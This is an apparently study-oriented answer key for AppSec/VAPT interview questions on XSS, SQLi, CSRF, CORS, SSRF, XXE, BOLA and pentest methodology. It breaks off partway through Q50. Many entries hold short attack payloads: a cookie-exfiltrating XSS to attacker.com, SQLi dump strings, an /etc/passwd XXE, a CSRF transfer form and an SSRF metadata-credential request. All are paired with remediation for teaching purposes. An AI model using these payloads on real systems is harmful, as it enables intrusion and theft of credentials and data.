# PwC AppSec / VAPT Interview — Answer Key (100 Questions)

Format used for every technical/vulnerability question:
**What it is → Types → Why it is vulnerable → How it's exploited (steps/PoC) → Remediation**

For process, methodology, and behavioral questions (where "exploited/PoC" doesn't apply),
the same five slots are adapted to: **What it is → Approaches/Variants → Why it's asked
(what interviewers probe) → How to structure your answer (with example) → Best-practice
takeaway.** This is flagged inline as `[Adapted format]`.

---

## SECTION 1 — Actually Reported PwC Questions

### 1. Walk through how XSS, SQLi, and file-upload attacks happen and how to bypass basic filters
- **What it is:** Three of the most common input-handling vulnerabilities in web apps — untrusted input is either rendered back to the browser (XSS), concatenated into a query (SQLi), or accepted as a file without proper validation (file upload).
- **Types:** XSS → Reflected, Stored, DOM-based. SQLi → In-band (error/union-based), Blind (boolean/time-based), Out-of-band. File upload → extension bypass, MIME-type spoofing, content-type/magic-byte bypass, path traversal in filename.
- **Why it is vulnerable:** Input is trusted and either reflected into HTML/JS context, or concatenated into SQL/file-system operations without proper encoding, parameterization, or validation.
- **How it's exploited / PoC:** XSS — inject `<script>alert(document.cookie)</script>` into a reflected parameter to prove cookie theft. SQLi — `' OR '1'='1' --` in a login field, or `' UNION SELECT username,password FROM users--` to dump data. File upload — rename `shell.php` to `shell.php.jpg`, or intercept in Burp and change `Content-Type: image/jpeg` while keeping PHP payload, then access the uploaded path to get code execution.
- **Remediation:** Output encoding + CSP for XSS; parameterized queries/prepared statements + least-privileged DB accounts for SQLi; server-side allow-listing of extensions, re-encoding/re-compressing uploaded images, storing files outside the webroot with randomized non-executable names for file upload.

### 2. Lead a junior through a full penetration test — describe the process
`[Adapted format]`
- **What it is:** End-to-end delivery of a pentest engagement as the lead, mentoring a junior.
- **Approaches/Variants:** Black-box / grey-box / white-box; web app vs network vs mobile engagement — process shape is the same, depth of recon differs.
- **Why it's asked:** Tests whether you understand the full lifecycle (not just "find bugs") and can manage/teach, since PwC delivers client engagements in teams.
- **How to structure your answer:** Scoping & rules of engagement → recon/OSINT → automated scanning → manual verification & exploitation (assign junior specific modules, review their findings) → post-exploitation (impact proof only, within scope) → reporting (severity, CVSS, remediation) → client walkthrough → retest.
- **Best-practice takeaway:** Emphasize quality control — reviewing the junior's PoCs before they go in the report, and teaching them to think about business impact, not just technical severity.

### 3. Describe CORS and how to mitigate a CORS misconfiguration
- **What it is:** Cross-Origin Resource Sharing — a browser mechanism that relaxes the Same-Origin Policy, letting a server explicitly allow specific other origins to read its responses via JS.
- **Types:** Simple requests vs preflighted requests; misconfigurations include reflecting `Origin` header verbatim, `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`, and trusting `null` origin.
- **Why it is vulnerable:** Overly permissive or dynamically-reflected origin whitelisting lets any attacker-controlled site read authenticated responses (session data, tokens) via a victim's browser.
- **How it's exploited / PoC:** Host a page on `evil.com` that does `fetch('https://victim.com/api/me', {credentials:'include'})`; if the server reflects `evil.com` back in `Access-Control-Allow-Origin` and allows credentials, the JS can read the victim's private data cross-origin.
- **Remediation:** Use a strict, server-side allow-list of trusted origins (never reflect `Origin` blindly); never combine `Allow-Origin: *` with `Allow-Credentials: true`; disable CORS entirely for endpoints that don't need cross-origin access.

### 4–5, 9. Behavioral: difficulty overcome / curiosity example / why PwC
`[Adapted format — STAR method]`
- **What it is:** Standard behavioral competency questions used across all PwC tracks, not security-specific.
- **Approaches/Variants:** Use the STAR structure — Situation, Task, Action, Result.
- **Why it's asked:** PwC's interview scoring explicitly weighs "curiosity," "care," and "working together" (its stated values) alongside technical skill.
- **How to structure your answer:** Pick a real technical incident (e.g., a tricky finding during a VAPT engagement or a scanner false-positive you had to prove/disprove), describe the obstacle, the specific action you took, and a measurable result (bug fixed, client satisfied, engagement delivered on time).
- **Best-practice takeaway:** Keep it under 90 seconds, be specific and honest, and end with what you'd do differently — interviewers probe reflection, not just outcome.

### 6–8, 10. Hackathon findings / CS fundamentals / resume deep-dive / why cybersecurity
`[Adapted format]`
- **What it is:** PwC's Launchpad/campus process blends coding fundamentals (DSA, OOP, DBMS, OS, Linux, SQL) with a resume-driven technical interview.
- **Approaches/Variants:** Written test → hackathon → technical panel → HR round.
- **Why it's asked:** To confirm baseline CS fundamentals (since many hires come through campus programs) and that your resume claims hold up under questioning.
- **How to structure your answer:** For fundamentals, be crisp and correct (e.g., OOP: encapsulation/inheritance/polymorphism/abstraction with one example each). For resume deep-dives, know every tool, CVE, and methodology you listed — expect "what would you do differently" follow-ups.
- **Best-practice takeaway:** Never list a skill/tool on your resume you can't defend for 5 minutes of follow-up questions — this is the single most common way candidates lose credibility in PwC technical rounds.

---

## SECTION 2 — Web Application Security & OWASP Top 10

### 12. SQL Injection
- **What it is:** Injection of attacker-controlled input into a SQL query, altering its logic.
- **Types:** In-band (error-based, UNION-based), Blind (boolean-based, time-based), Out-of-band (DNS/HTTP exfiltration).
- **Why it is vulnerable:** User input is concatenated directly into a query string instead of being treated as data.
- **How it's exploited / PoC:** `' UNION SELECT null,username,password FROM users-- -` on a vulnerable search parameter to dump credentials; for blind time-based, `' OR IF(1=1,SLEEP(5),0)-- -` and observe response delay to confirm injection.
- **Remediation:** Parameterized queries/prepared statements, ORM with proper escaping, least-privilege DB accounts, input validation as defense-in-depth, WAF as a secondary control (not primary).

### 13. XSS (Reflected/Stored/DOM)
- **What it is:** Injection of attacker-controlled script that executes in a victim's browser in the vulnerable site's origin.
- **Types:** Reflected (payload in request, reflected immediately in response), Stored (payload persisted in DB, served to other users), DOM-based (client-side JS writes untrusted data into the DOM without a server round-trip).
- **Why it is vulnerable:** Untrusted input is rendered into HTML/JS/attribute context without context-aware output encoding.
- **How it's exploited / PoC:** Stored — post a comment containing `<img src=x onerror=fetch('https://attacker.com/c?'+document.cookie)>`; every visitor's cookie is exfiltrated. DOM-based — a client-side sink like `element.innerHTML = location.hash` executed with `#<img src=x onerror=alert(1)>`.
- **Remediation:** Context-aware output encoding (HTML/attribute/JS/URL encoding as appropriate), Content-Security-Policy, HttpOnly on session cookies, avoid dangerous sinks (`innerHTML`, `eval`) or sanitize before use.

### 14. CSRF
- **What it is:** Forces an authenticated victim's browser to submit an unwanted state-changing request to a site they're logged into.
- **Types:** GET-based CSRF (via `<img>` tag), POST-based (via auto-submitting form), login CSRF (forces victim into attacker's account).
- **Why it is vulnerable:** Browsers auto-attach cookies to cross-site requests, and the server relies solely on the cookie for authentication without verifying request origin/intent.
- **How it's exploited / PoC:** Host `<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>` on a page the logged-in victim visits.
- **Remediation:** Anti-CSRF tokens (synchronizer token pattern), `SameSite=Lax/Strict` cookies, re-authentication for sensitive actions, checking `Origin`/`Referer` header as defense-in-depth.

### 15. SOP, CORS, CSP
- **What it is:** Three browser-enforced security boundaries — SOP isolates origins by default, CORS selectively relaxes SOP for XHR/fetch, CSP restricts what resources/scripts a page may load/execute.
- **Types:** N/A (mechanisms, not vuln classes) — but each has misconfiguration variants (permissive CORS, weak/missing CSP directives like `unsafe-inline`).
- **Why it is vulnerable:** Misconfiguration of any of the three (permissive CORS, `unsafe-inline` in CSP) reopens the exact cross-origin/script-injection risks these controls exist to close.
- **How it's exploited / PoC:** A CSP with `script-src 'self' 'unsafe-inline'` does nothing to stop a reflected XSS payload, since inline scripts are still allowed to execute.
- **Remediation:** Strict CORS allow-lists, CSP with nonces/hashes instead of `unsafe-inline`, `frame-ancestors` to prevent clickjacking, regularly test the actual deployed policy (not just what's documented).

### 16. SSRF
- **What it is:** A server-side feature makes an outbound request to a user-supplied URL, letting an attacker reach internal-only resources.
- **Types:** Basic SSRF (direct response returned to attacker), Blind SSRF (no direct response, inferred via timing/DNS/OOB), Semi-blind (partial info in errors).
- **Why it is vulnerable:** The backend trusts a user-controlled URL and fetches it from inside the trusted network without validating the resolved destination.
- **How it's exploited / PoC:** Submit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as an "import from URL" input; the server fetches and may leak live cloud IAM credentials in the response or an error message.
- **Remediation:** Resolve DNS and validate the actual destination IP against a deny-list of internal ranges before fetching; disable redirect-following or re-validate on every hop; use IMDSv2 on AWS; never reflect fetched content back to the user.

### 17. IDOR vs BOLA
- **What it is:** Both describe accessing another user's object by manipulating an identifier; BOLA (OWASP API Top 10 term) is the API-context evolution of the older web term IDOR.
- **Types:** Sequential ID enumeration, predictable/encoded ID guessing, parameter tampering on hidden/API fields.
- **Why it is vulnerable:** The endpoint authenticates the caller but never checks whether the caller actually owns the requested object.
- **How it's exploited / PoC:** Authenticated as user A (`order_id=1001`), change to `order_id=1002` in the request and receive user B's full order data.
- **Remediation:** Scope every object-fetch query by the authenticated user's ID at the database-query level; return identical 404s for "doesn't exist" and "not yours"; use non-guessable UUIDs as defense-in-depth.

### 18. XXE
- **What it is:** Exploiting an XML parser that resolves external entities, letting an attacker read local files or trigger SSRF via a crafted XML document.
- **Types:** Classic XXE (file read via entity), Blind/OOB XXE (exfiltration via DNS/HTTP), XXE-based SSRF, billion-laughs (DoS via entity expansion).
- **Why it is vulnerable:** The XML parser has DTD processing and external entity resolution enabled by default.
- **How it's exploited / PoC:** Submit `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` to an endpoint that parses XML (e.g., a file-upload or SOAP API) and observe `/etc/passwd` contents reflected back.
- **Remediation:** Disable DTD processing and external entity resolution in the XML parser configuration (library-specific hardening flags); prefer JSON where possible; validate/allow-list XML input schemas.

### 19. Insecure Deserialization
- **What it is:** An application deserializes untrusted data into objects, and the deserialization process itself can be hijacked to execute code or manipulate application logic.
- **Types:** Object injection leading to RCE (Java `ObjectInputStream`, PHP `unserialize`, Python `pickle`), data-tampering attacks (modifying a serialized session/role object).
- **Why it is vulnerable:** The deserializer instantiates and calls methods on arbitrary classes present on the classpath/environment based on attacker-supplied byte streams, with no integrity check.
- **How it's exploited / PoC:** Using a tool like `ysoserial` to generate a malicious serialized Java object using a known "gadget chain" (e.g., CommonsCollections), submit it where the app calls `ObjectInputStream.readObject()`, achieving remote code execution.
- **Remediation:** Avoid native deserialization of untrusted data entirely; if unavoidable, use signed/integrity-checked payloads, allow-list classes that may be deserialized, and keep deserialization libraries patched.

### 20. Open Redirect
- **What it is:** An app redirects users to a URL supplied via a parameter without validating it stays within the trusted domain.
- **Types:** Direct parameter-based (`?redirect=`), encoded/obfuscated bypasses (`//evil.com`, `/\evil.com`, double-encoding).
- **Why it is vulnerable:** The redirect target is taken from user input and used directly in a `Location` header/JS redirect with no destination validation.
- **How it's exploited / PoC:** Send a phishing link `https://trusted.com/login?redirect=https://evil.com/fake-login` — victim trusts the domain in the URL bar, clicks through, and lands on a credential-harvesting clone.
- **Remediation:** Validate redirect targets against an allow-list of internal paths/domains; use relative paths only; if external redirects are required, show an interstitial warning page.

### 21. Clickjacking
- **What it is:** Tricking a user into clicking something different from what they perceive, by overlaying an invisible iframe of the target site over a decoy page.
- **Types:** Classic UI-redress (invisible iframe), likejacking, cursorjacking.
- **Why it is vulnerable:** The vulnerable page can be embedded in an `<iframe>` on an attacker's site with no frame-busting protection.
- **How it's exploited / PoC:** Embed the victim's "delete account" or "transfer funds" page in a transparent iframe positioned under an enticing "Click here to win" button on the attacker's page.
- **Remediation:** `X-Frame-Options: DENY/SAMEORIGIN` header, or better, CSP `frame-ancestors 'self'`; for sensitive actions, add a confirmation step that can't be blindly clicked through.

### 22. HTTP Request Smuggling
- **What it is:** Exploiting discrepancies in how a front-end proxy/load balancer and back-end server interpret the boundary between two HTTP requests (usually via conflicting `Content-Length` and `Transfer-Encoding` headers).
- **Types:** CL.TE, TE.CL, TE.TE (obfuscated Transfer-Encoding) smuggling.
- **Why it is vulnerable:** Front-end and back-end servers disagree on request length, letting an attacker "smuggle" a second, hidden request that gets prepended to the next legitimate user's request.
- **How it's exploited / PoC:** Send a crafted request with both headers where the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding: chunked`, causing the back-end to treat part of the smuggled body as the start of the next user's request — can be used to hijack sessions or bypass front-end security controls.
- **Remediation:** Normalize on HTTP/2 end-to-end where possible; ensure front-end and back-end agree strictly on request parsing; reject ambiguous requests with both headers present.

### 23. Security Headers
- **What it is:** HTTP response headers that instruct the browser to enforce additional security behaviors.
- **Types:** HSTS (forces HTTPS), CSP (restricts resource/script sources), X-Content-Type-Options (`nosniff`, stops MIME sniffing), Referrer-Policy (limits referrer leakage), Permissions-Policy (restricts browser feature access).
- **Why it is vulnerable (absence):** Missing headers leave the browser at its permissive defaults, enabling downgrade attacks, MIME-confusion attacks, and information leakage.
- **How it's exploited / PoC:** Without `nosniff`, a server misconfigured to serve a malicious file as `text/plain` can still be executed as HTML/JS by browsers that sniff content type, enabling stored XSS via a "harmless" file upload.
- **Remediation:** Deploy the full recommended header set at the web-server/gateway layer, and verify with tools like Mozilla Observatory or securityheaders.com during every release.

### 24. File Upload Vulnerabilities
- **What it is:** Insufficient validation of uploaded files allows an attacker to upload and later execute malicious content.
- **Types:** Unrestricted extension upload (webshell), MIME-type/Content-Type spoofing, path traversal in filename (`../../`), decompression bombs, image-parser exploits (ImageTragick-style).
- **Why it is vulnerable:** Validation relies on client-supplied or easily-spoofed attributes (extension, `Content-Type` header) rather than actual file content.
- **How it's exploited / PoC:** Upload `shell.php.jpg` or a polyglot GIF/PHP file; if the server stores it in a web-accessible, executable directory, browse to it to trigger code execution.
- **Remediation:** Validate file content/magic bytes, re-encode images server-side, store uploads outside the webroot with randomized names and no execute permission, enforce strict size/type allow-lists.

### 25. Race Conditions
- **What it is:** Exploiting the timing window between a check and the corresponding action (TOCTOU) to bypass business logic.
- **Types:** Single-endpoint race (e.g., redeem-coupon spammed in parallel), multi-endpoint/limit-overrun races (e.g., simultaneous withdrawal requests against one balance).
- **Why it is vulnerable:** The application checks a condition (balance, coupon validity) and performs the action in separate, non-atomic steps, so concurrent requests can all pass the check before any of them completes the action.
- **How it's exploited / PoC:** Use Burp's "Turbo Intruder" or a scripted parallel-request tool to fire 20 simultaneous "redeem coupon" or "apply discount" requests at the exact same instant, redeeming a single-use coupon multiple times.
- **Remediation:** Use atomic database operations/transactions with row-level locking, idempotency keys, or optimistic concurrency control instead of check-then-act logic.

---

## SECTION 3 — VAPT Methodology & Tools

### 26. VA vs PT
- **What it is:** Vulnerability Assessment identifies and catalogs weaknesses (mostly automated, breadth-first); Penetration Testing actively exploits them to prove real-world impact (mostly manual, depth-first).
- **Types:** VA — network VA, web VA, config review. PT — black/grey/white box, red team (adversarial, objective-based).
- **Why it is vulnerable [N/A — process question]:** Organizations often confuse the two and buy a VA scan expecting PT-level assurance, missing business-logic and chained vulnerabilities that only manual exploitation surfaces.
- **How it's exploited / PoC [Adapted — how to explain]:** Give a concrete example: a VA scan flags "outdated jQuery version" as informational; a PT actually chains that with a misconfigured endpoint to achieve stored XSS and session hijacking, proving real business impact.
- **Remediation [Adapted — recommendation]:** Run VA continuously (weekly/monthly automated scans) and PT periodically (quarterly/annually or after major releases) — they're complementary, not substitutes.

### 27. VAPT Methodology
`[Adapted format]`
- **What it is:** The structured lifecycle followed for any assessment engagement.
- **Approaches/Variants:** Scoping & ROE → passive/active recon → automated vulnerability scanning → manual verification & exploitation → post-exploitation/impact proof → reporting → remediation support → retest.
- **Why it's asked:** Confirms you follow a repeatable, auditable process rather than ad hoc poking — critical for a consulting firm that must defend its work to clients and auditors.
- **How to structure your answer:** Narrate one real engagement end-to-end using this skeleton, calling out where you deviated and why.
- **Best-practice takeaway:** Always mention documentation and evidence capture at every phase — in consulting, an unreported finding didn't happen.

### 28. Testing Standards
`[Adapted format]`
- **What it is:** Formal frameworks that standardize test coverage and rigor.
- **Approaches/Variants:** OWASP WSTG/ASVS (web app depth/coverage), PTES (full engagement lifecycle), NIST SP 800-115 (technical guide to IT security testing), OSSTMM (operational security metrics).
- **Why it's asked:** Client-facing consulting firms must map deliverables to recognized standards for compliance (PCI-DSS, SOC 2, ISO 27001).
- **How to structure your answer:** Name the standard(s) you've actually used, and give one example of how ASVS level (1/2/3) changed your test depth on a real engagement.
- **Best-practice takeaway:** Know at minimum OWASP WSTG checklist structure — it's the most commonly referenced in Indian AppSec/VAPT interviews.

### 29. Black/Grey/White Box
`[Adapted format]`
- **What it is:** Testing approaches differentiated by how much internal knowledge/access the tester starts with.
- **Approaches/Variants:** Black-box (no internal knowledge, simulates external attacker), grey-box (partial access — e.g., low-privilege credentials), white-box (full source code/architecture access).
- **Why it's asked:** Tests whether you can advise a client on the right engagement type for their goals and budget.
- **How to structure your answer:** Recommend grey-box for most business-logic-heavy apps (best ROI — mirrors an actual insider/compromised-account threat), white-box for high-assurance/regulated apps, black-box for red-team/attack-surface exercises.
- **Best-practice takeaway:** Mention time/cost trade-offs — black-box finds fewer bugs per hour than grey/white-box.

### 30. Tools
`[Adapted format]`
- **What it is:** The toolchain used across recon, scanning, and exploitation phases.
- **Approaches/Variants:** Burp Suite (proxy/manual testing), Nmap (network/service discovery), Nessus/Nikto (vulnerability scanning), Metasploit (exploitation framework), sqlmap (automated SQLi), ffuf/gobuster (content discovery).
- **Why it's asked:** Confirms hands-on familiarity, not just theory.
- **How to structure your answer:** Map each tool to the specific phase/vulnerability class you use it for, and mention one manual technique you use to validate an automated tool's finding (avoiding false positives).
- **Best-practice takeaway:** Emphasize that tools surface leads — manual verification and business-logic testing is where the real value/differentiation comes from in a consulting engagement.

### 31. Handling False Positives
`[Adapted format]`
- **What it is:** Distinguishing genuine vulnerabilities from scanner noise before they reach a client report.
- **Approaches/Variants:** Manual PoC reproduction, cross-referencing with a second tool, checking version/patch-level context, reviewing scanner confidence/CVSS vector details.
- **Why it's asked:** A report full of false positives damages client trust and wastes remediation effort — a core professional-services risk.
- **How to structure your answer:** Describe your verification workflow — e.g., you don't report a "SQLi" flagged by a scanner until you've manually reproduced a boolean/time-based response difference yourself.
- **Best-practice takeaway:** Never ship an unverified automated finding directly into a client deliverable.

### 32. Post-Exploitation & Lateral Movement
- **What it is:** Actions taken after initial compromise to demonstrate real business impact and map further access — within agreed scope.
- **Types:** Privilege escalation (local), credential harvesting, lateral movement (pivoting to other hosts/segments), persistence (only if explicitly in scope, rare in standard VAPT).
- **Why it is vulnerable [context]:** Flat networks, reused local admin credentials, and excessive trust between systems let a single foothold cascade into full domain compromise.
- **How it's exploited / PoC:** From an initial web-shell foothold, dump local credentials (e.g., via Mimikatz where in scope), check for credential reuse across hosts, and pivot via SSH/RDP to a second host to prove cross-system impact — always stopping at the pre-agreed boundary.
- **Remediation:** Network segmentation, unique local admin passwords per host (LAPS), least-privilege service accounts, monitoring for lateral movement indicators (unusual authentication patterns).

### 33. Report Writing
`[Adapted format]`
- **What it is:** Translating technical findings into a document useful for both remediation (developer) and risk decisions (leadership).
- **Approaches/Variants:** Executive summary (business risk, non-technical), detailed findings (technical, with PoC/evidence, CVSS, remediation steps), appendices (raw scan data/logs).
- **Why it's asked:** The report is the actual deliverable a client pays for — writing quality is as important as finding quality at a consulting firm.
- **How to structure your answer:** Describe a two-tier structure and give an example of "translating" one technical finding into a one-line business-risk statement for the exec summary.
- **Best-practice takeaway:** Always include clear, actionable remediation steps, not just "fix the vulnerability" — developers need specifics (code patterns, config changes).

### 34. CVSS Scoring
- **What it is:** A standardized scoring system (0–10) capturing a vulnerability's technical severity based on exploitability and impact metrics.
- **Types:** Base score (intrinsic severity), Temporal score (exploit maturity, patch availability), Environmental score (adjusted for the specific organization's context).
- **Why it is vulnerable [context — where it disagrees with business risk]:** A high CVSS score (e.g., a critical RCE on an internal-only, air-gapped test server) may carry low real business risk, while a "medium" CVSS logic flaw exposing customer PII may be a critical business issue — CVSS doesn't model business context by default.
- **How it's exploited / PoC [Adapted]:** Calculate Base metrics (Attack Vector, Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability impact) for a real finding and show the resulting score, then explain why you'd adjust the reported severity using the Environmental score.
- **Remediation [Adapted]:** Always pair CVSS with a business-impact narrative in the report — don't let the client triage purely off the numeric score.

### 35. "Tell me about the last vulnerability you found"
`[Adapted format — behavioral/technical hybrid]`
- **What it is:** A direct probe into your hands-on experience and ability to communicate impact.
- **Approaches/Variants:** Pick a finding with a clear technical mechanism AND a clear business consequence.
- **Why it's asked:** Distinguishes candidates who've actually done hands-on testing from those who only know theory.
- **How to structure your answer:** What it was (vuln class) → how you found it (methodology/tool) → how you proved it (PoC) → what the business impact was → how it was remediated and retested.
- **Best-practice takeaway:** Always end with the remediation and retest outcome — shows you own findings through to closure, not just discovery.

### 36. Testing Production Safely
`[Adapted format]`
- **What it is:** Balancing thorough testing against the risk of disrupting a live business system.
- **Approaches/Variants:** Testing in a staging/UAT environment where possible; if production-only, time-box testing during low-traffic windows, avoid destructive payloads (no `DROP TABLE`, no real fund transfers), rate-limit your own scanning.
- **Why it's asked:** A real operational risk clients care about deeply — a botched VAPT causing an outage is a career/contract-ending mistake.
- **How to structure your answer:** Describe explicit rules-of-engagement negotiation before testing starts (excluded endpoints, blackout windows, emergency contact/kill-switch process).
- **Best-practice takeaway:** Always confirm a client-side point of contact and an agreed "stop testing" signal before starting production testing.

### 37. Retesting
`[Adapted format]`
- **What it is:** Verifying that a previously reported vulnerability has actually been fixed.
- **Approaches/Variants:** Re-run the exact original PoC; also test for incomplete fixes (e.g., fixed on one endpoint but not a near-identical one) and regressions elsewhere.
- **Why it's asked:** Superficial retesting ("does the exact payload still work") misses partial fixes — a common real-world failure mode.
- **How to structure your answer:** Explain checking (a) the original PoC no longer works, (b) logically similar bypass variants also fail, (c) the fix didn't break functionality or introduce a new issue.
- **Best-practice takeaway:** Always retest with slightly varied payloads, not just the exact original string — developers often patch only the literal reported case.

### 38. Staying Updated
`[Adapted format]`
- **What it is:** Continuous learning discipline expected of every security professional.
- **Approaches/Variants:** CVE feeds/NVD, security Twitter/X and blogs (PortSwigger research, Project Zero), CTFs/bug bounty practice, conference talks (DEF CON, Black Hat), vendor advisories for tools you test.
- **Why it's asked:** The threat landscape changes fast; stagnant knowledge is a real risk in a testing role.
- **How to structure your answer:** Name specific sources you actually follow and one recent technique/CVE you learned and applied.
- **Best-practice takeaway:** Tie it back to your certifications (CEH, CNSP) and ongoing eWPTX prep as evidence of continuous upskilling.

---

## SECTION 4 — API Security

### 39. Why API security is distinct
`[Adapted format]`
- **What it is:** The recognition that APIs are consumed by arbitrary clients (mobile apps, other services) with no browser sandbox enforcing SOP/CSP/cookies.
- **Approaches/Variants:** N/A.
- **Why it is vulnerable:** Because there's no browser-side safety net, authorization must be enforced entirely server-side on every request — exactly the check that's easiest to forget.
- **How it's exploited / PoC:** This is precisely why BOLA is the #1 API vulnerability — nothing on the client side would ever have caught a missing server-side ownership check.
- **Remediation:** Treat every API endpoint as if it will be called directly by a hostile client with a valid token — never rely on "the app UI doesn't expose this" as a control.

### 40. OWASP API Security Top 10 (2023)
- **What it is:** The standard risk-ranked list of API-specific vulnerability classes.
- **Types:** API1 BOLA, API2 Broken Authentication, API3 Broken Object Property Level Authorization, API4 Unrestricted Resource Consumption, API5 Broken Function Level Authorization, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs.
- **Why it is vulnerable:** Each arises from APIs being built and shipped faster than their authorization/validation logic is reviewed.
- **How it's exploited / PoC:** (see Q41–50 for specific PoCs of the top risks).
- **Remediation:** Adopt API-specific SDL practices — schema validation, per-field authorization reviews, and a maintained API inventory — rather than assuming general web AppSec practices cover APIs.

### 41. BOLA
- **What it is:** An endpoint returns/modifies an object by ID with no check that the caller owns it.
- **Types:** Sequential-ID BOLA, UUID-based BOLA (still exploitable, just not enumerable), nested-object BOLA (ownership check on the parent but not a nested child object).
- **Why it is vulnerable:** Authentication passes (valid token), but authorization ("do you own this specific object") is never separately checked.
- **How it's exploited / PoC:** `GET /api/v1/orders/54321` (your own order) works; changing to `/orders/54322` returns a stranger's full order and payment details.
- **Remediation:** Scope every object-fetch at the query level (`WHERE id=? AND customer_id=?`), return identical 404s regardless of reason, add automated tests that assert user A cannot fetch user B's known object ID.

### 42. Mass Assignment
- **What it is:** Binding the entire client-supplied JSON body directly to an internal data model, allowing undocumented/privileged fields to be set.
- **Types:** Privilege-field injection (`role`, `isAdmin`), pricing/balance manipulation, verification-status tampering.
- **Why it is vulnerable:** Frameworks offering convenient auto-binding (`Model.update(req.body)`) write any field that exists on the model with no explicit allow-list.
- **How it's exploited / PoC:** `PATCH /api/v1/users/me` with body `{"name":"Bob","account_tier":"enterprise"}` — if `account_tier` exists on the model, it silently gets upgraded even though the UI never exposes that field.
- **Remediation:** Explicit allow-list of client-writable fields per endpoint (never bind the raw request body); put privileged fields behind their own dedicated, separately-authorized endpoint.

### 43. BOLA vs Broken Function-Level Authorization (BFLA)
- **What it is:** BOLA (API1) is about which *object* a user can act on; BFLA (API5) is about which *functionality/endpoint* a user can call at all.
- **Types:** BFLA — vertical (regular user calling an admin endpoint), horizontal function abuse (calling another role's endpoint at the same privilege tier).
- **Why it is vulnerable:** The endpoint checks only "is this a valid token," never "does this token's role permit this specific action."
- **How it's exploited / PoC:** A regular user's valid token successfully calls `POST /api/admin/users/{id}/promote` because the endpoint has no role check at all.
- **Remediation:** Enumerate every endpoint by intended role (public/user/admin/service) and enforce role checks server-side on each; test explicitly with a lower-privileged token against every "should be restricted" endpoint.

### 44. API Rate Limiting vs Login Rate Limiting
`[Adapted format]`
- **What it is:** Controls that cap how much a client can do in a given time window.
- **Approaches/Variants:** Login rate limiting — IP/account-based, aimed at brute force. API rate limiting — needs to be per-identity (token/API key), tiered by endpoint cost (cheap health-check vs expensive export), with hard caps on payload/response size.
- **Why it's vulnerable without this:** A single authenticated client can cause damage via expensive queries or bulk exports that look nothing like "attack traffic" to a simple IP-based limiter.
- **How it's exploited / PoC:** An attacker with one valid, low-privilege API key repeatedly calls an expensive `/export/all-orders` endpoint just under the per-minute IP limit, exfiltrating the entire dataset slowly over hours.
- **Remediation:** Per-identity, per-endpoint-cost rate limiting plus absolute caps on pagination/result size/computation, not just requests-per-minute.

### 45. Shadow APIs
- **What it is:** Undocumented, deprecated, or forgotten API endpoints that remain live and unprotected.
- **Types:** Old app-version endpoints still active, internal debug endpoints that shipped by accident, one-off integration endpoints that outlived their purpose.
- **Why it is vulnerable:** They were never part of the reviewed, documented API inventory, so no security review was ever applied.
- **How it's exploited / PoC:** Decompiling a mobile app binary reveals a call to `/v2/debug/dump-user-session?user_id=X` with no authentication — full session data for any user is returned.
- **Remediation:** Route all traffic through a single gateway with a default-deny policy for unregistered routes; strip debug endpoints at build time; run continuous API discovery against production traffic and compare to the documented inventory.

### 46. Testing Authorization from a Swagger/Postman Collection
`[Adapted format]`
- **What it is:** Systematically testing every documented endpoint for authorization flaws using only the API spec/collection as a starting point.
- **Approaches/Variants:** Horizontal privilege testing (swap object IDs between two low-privilege test accounts), vertical privilege testing (call admin endpoints with a regular user's token), unauthenticated access testing (strip the auth header entirely).
- **Why it's asked:** Tests practical methodology for a very common real-world engagement input.
- **How to structure your answer:** Import the collection into Burp/Postman, create two test accounts of different privilege levels, systematically replay every endpoint swapping tokens/IDs, and log which endpoints don't enforce ownership/role checks.
- **Best-practice takeaway:** Automate this matrix (every endpoint × every role/identity combination) rather than testing ad hoc — this is exactly how BOLA/BFLA findings are systematically surfaced.

### 47. GraphQL-specific attack
- **What it is:** Deeply nested or aliased GraphQL queries that cause combinatorial backend work from what looks like one small request.
- **Types:** Nested-query resource exhaustion, query batching abuse, field aliasing to bypass a root-level-only authorization check.
- **Why it is vulnerable:** GraphQL lets a client compose arbitrary nested traversals of the data graph in a single request, and if authorization/cost limits are only checked at the root, deeper fields go unchecked.
- **How it's exploited / PoC:** Submit a query nesting `friends { friends { friends { ... } } }` many levels deep, or alias the same sensitive field dozens of times (`emp1: employee(id:"A"){salary} emp2: employee(id:"B"){salary}...`) to bulk-extract data past a root-only auth check.
- **Remediation:** Enforce max query depth and a computed cost/complexity budget at the validation layer; disable introspection/batching in production; enforce authorization inside every field resolver, not just at the query root.

### 48. Unsafe Consumption of Third-Party APIs (API10)
`[Adapted format]`
- **What it is:** Trusting data/responses coming back from a third-party API integration without the same validation applied to end-user input.
- **Approaches/Variants:** Blind redirect-following, unsafe deserialization of third-party responses, unverified webhook payload trust.
- **Why it's vulnerable:** Teams often apply rigorous validation to user input but implicitly trust "our own backend's" API calls to partners.
- **How it's exploited / PoC:** A compromised or malicious payment-processor webhook sends a fabricated "payment successful" callback with no signature verification, and the app credits the order as paid.
- **Remediation:** Treat every third-party API response as untrusted input — validate schemas, verify webhook signatures (HMAC), and don't blindly follow redirects from partner responses.

### 49. Gateway vs Service-Level Security Responsibilities
`[Adapted format]`
- **What it is:** Dividing security controls between a centralized API gateway and each backend microservice.
- **Approaches/Variants:** Gateway — TLS termination, coarse authentication, schema validation, global rate limiting. Service — fine-grained, resource-level (BOLA-style) authorization.
- **Why it's vulnerable if conflated:** Assuming "the gateway already handles auth" and skipping in-service ownership checks is the most common real-world path to BOLA.
- **How it's exploited / PoC:** A gateway confirms a valid token exists, forwards the request to `billing-service`, which trusts the gateway's pass-through and skips its own ownership check — any authenticated user can now fetch any invoice.
- **Remediation:** Keep the gateway responsible for coarse, cross-cutting controls only; enforce fine-grained authorization inside the service that owns the business logic and data.

### 50. SSRF via Webhook/Import Feature
- **What it is:** (Same underlying vuln as Q16, API-specific instance) — a "fetch this URL" feature abused to reach internal-only resources.
- **Types:** Direct fetch SSRF, webhook-URL SSRF, DNS-rebinding SSRF (bypasses simple hostname validation).
- **Why it is vulnerable:** The backend fetches a user-supplied URL from inside the trusted network without validating the resolved IP.
